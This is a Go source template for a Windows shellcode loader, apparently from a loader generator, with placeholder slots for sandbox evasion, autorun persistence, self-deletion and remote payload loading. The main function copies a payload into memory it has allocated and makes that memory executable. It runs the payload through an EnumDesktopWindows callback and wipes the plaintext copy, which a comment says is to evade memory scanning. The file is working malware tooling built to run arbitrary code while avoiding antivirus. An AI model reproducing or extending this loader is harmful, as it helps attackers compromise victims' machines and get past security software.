package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
	//__IMPORT__
	//__IMPORT_SandBox__
	//__IMPORT_FenLi__
	//__IMPORT_YuanCheng__
	//__IMPORT_AutoRun__
	//__IMPORT_AutoDelete__
)


//__DECODE_Func__

//__FenLi_Func__
//__AutoDelete_Func__

//__YuanCheng_Func__

//__SANDBOX_Func__

//__AutoRun_Func__

func main() {
	//__SANDBOX_Main__
	//__AutoRun_Main__
	//__AutoYunDelete_Main__
	//__AutoDelete_Main__

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ntdll := windows.NewLazyDLL("ntdll.dll")
	User32 := windows.NewLazyDLL("User32.dll")
	//__FenLi_Main__
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	//__DECODE_Main__
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GetCurrentThreadId := kernel32.NewProc("GetCurrentThreadId")
	EnumDesktopWindows := User32.NewProc("EnumDesktopWindows")
	GetThreadDesktop := User32.NewProc("GetThreadDesktop")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
	//__YuanCheng_Main__

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteArray)), 0x1000, 0x04)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteArray[0])), uintptr(len(byteArray)))
	for i := range byteArray { byteArray[i] = 0 } // 拷贝完成后立即清除堆上明文，降低内存扫描命中
	oldProtect := 0x04
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteArray)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
	Thr, _, _ := GetCurrentThreadId.Call()
	ThrD, _, _ := GetThreadDesktop.Call(Thr)

	EnumDesktopWindows.Call(ThrD, addr, 0)
}
